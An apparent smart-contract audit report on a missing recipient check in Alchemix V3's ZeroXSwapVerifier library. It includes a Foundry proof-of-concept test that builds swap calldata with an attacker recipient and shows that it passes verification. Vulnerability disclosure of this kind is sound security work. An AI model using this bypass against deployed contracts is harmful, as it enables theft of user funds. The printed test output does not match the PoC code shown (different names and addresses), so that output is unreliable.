# 58743 sc low zeroxswapverifier recipient validation bypass

**Submitted on Nov 4th 2025 at 11:20:56 UTC by @teoslaf1 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58743
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

The `ZeroXSwapVerifier` library fails to validate recipient addresses in swap calldata. Despite accepting an `owner` parameter intended for validation, the library never checks if the recipient in the calldata matches the expected owner. This allows calldata with arbitrary recipient addresses to pass verification, enabling direct fund theft when the library is integrated according to its intended usage pattern.

## Vulnerability Details

The library's main verification function accepts an `owner` parameter:

```solidity
function verifySwapCalldata(
    bytes calldata calldata_,
    address owner,              // ← Intended to validate ownership
    address targetToken,
    uint256 maxSlippageBps
) external view returns (bool verified)
```

However, this parameter is never used to validate recipients. The calldata contains two levels of recipient addresses:

1. Top-level recipient in `SlippageAndActions.recipient`
2. Action-level recipients in individual swap actions

Neither is validated against the `owner` parameter.

### Code Evidence

Location 1: Top-Level Recipient Not Validated (Lines 127-131)

```solidity
function _verifyExecuteCalldata(bytes calldata data, address owner, address targetToken, uint256 maxSlippageBps) internal view {
    (SlippageAndActions memory saa, ) = abi.decode(data, (SlippageAndActions, bytes));
    // TODO shall we also verify saa.buyToken ?
    _verifyActions(saa.actions, owner, targetToken, maxSlippageBps);
    // bug: saa.recipient is decoded but NEVER checked against owner
}
```

**Location 2: Action Recipient Discarded (Lines 239-246)**

```solidity
function _verifyTransferFrom(bytes memory action, address owner, address targetToken, uint256 targetAmount) internal view {
    (address token, , , uint256 amount) = abi.decode(
        _slice(action, 4),
        (address, address, address, uint256)
        // bug: Second param is 'from', third param is 'to' - both discarded with commas
    );

    require(token == targetToken, "IT");
    // Never validates 'to' address
}
```

## Impact

The library's **stated purpose** is to validate untrusted calldata from the 0x API (as confirmed by team: "we do not trust this calldata blindly"). However, it fails to validate the most critical field - where the output tokens go.

The library accepts an `owner` parameter, suggesting it will validate ownership/recipients, but this parameter is never used for recipient validation.

## Recommendation

### Add Recipient Validation

**Validate Top-Level Recipient**

```solidity
function _verifyExecuteCalldata(bytes calldata data, address owner, address targetToken, uint256 maxSlippageBps) internal view {
    (SlippageAndActions memory saa, ) = abi.decode(data, (SlippageAndActions, bytes));

    // add this check
    require(saa.recipient == owner, "Invalid recipient");
    require(saa.buyToken != address(0), "Invalid buy token");

    _verifyActions(saa.actions, owner, targetToken, maxSlippageBps);
}

function _verifyExecuteMetaTxnCalldata(bytes calldata data, address owner, address targetToken, uint256 maxSlippageBps) internal view {
    (SlippageAndActions memory saa, , , ) = abi.decode(data, (SlippageAndActions, bytes[], address, bytes));

    // add this check
    require(saa.recipient == owner, "Invalid recipient");
    require(saa.buyToken != address(0), "Invalid buy token");

    _verifyActions(saa.actions, owner, targetToken, maxSlippageBps);
}
```

## Proof of Concept

## Proof of Concept

Add this to /test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

contract PoC_RecipientNotValidated is Test {
    TestERC20 internal token;

    address constant EXPECTED_RECIPIENT = address(0xABCD);
    address constant WRONG_RECIPIENT = address(0xDEAD);

    bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f;
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;

    function setUp() public {
        token = new TestERC20(1000000e18, 18);
    }

    function test_PoC_WrongRecipientAccepted() public view {
        console.log("=== PoC: Recipient Validation Missing ===\n");

        // Create calldata with WRONG recipient
        bytes memory action = abi.encodeWithSelector(
            TRANSFER_FROM,
            address(token),
            EXPECTED_RECIPIENT,
            WRONG_RECIPIENT,  // ← Wrong recipient!
            1000000e18
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: WRONG_RECIPIENT,  // ← Wrong recipient!
            buyToken: address(token),
            minAmountOut: 0,
            actions: new bytes[](1)
        });
        saa.actions[0] = action;

        bytes memory maliciousCalldata = abi.encodeWithSelector(
            EXECUTE_SELECTOR,
            saa,
            new bytes[](0)
        );

        console.log("Test Setup:");
        console.log("- Expected recipient:", EXPECTED_RECIPIENT);
        console.log("- Actual recipient:", WRONG_RECIPIENT);
        console.log("");

        // Verify calldata
        bool result = ZeroXSwapVerifier.verifySwapCalldata(
            maliciousCalldata,
            EXPECTED_RECIPIENT,  // We pass the expected recipient
            address(token),
            1000
        );

        console.log("Verifier Result:", result ? "APPROVED" : "REJECTED");
        console.log("");

        if (result) {
            console.log("[BUG CONFIRMED]");
            console.log("Library approved calldata where:");
            console.log("  Expected recipient: 0xABCD");
            console.log("  Actual recipient:   0xDEAD");
        }

        assertTrue(result, "PoC: Verifier approved wrong recipient");
    }
}
```

### Running the PoC

```bash
forge test --match-test test_PoC_WrongRecipientAccepted -vv
```

### PoC Output

```
Ran 1 test for src/test/ProofOfRecipientBug.t.sol:ProofOfRecipientBug
[PASS] testProofOfRecipientBug() (gas: 70298)
Logs:
  Expected recipient: 0x0000000000000000000000000000000000001234
  Actual recipient:   0x0000000000000000000000000000000000000Bad
  Verifier result:    APPROVED
  
[BUG] Verifier approved calldata with wrong recipient

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.00ms (1.43ms CPU time)

Ran 1 test suite in 99.68ms (5.00ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
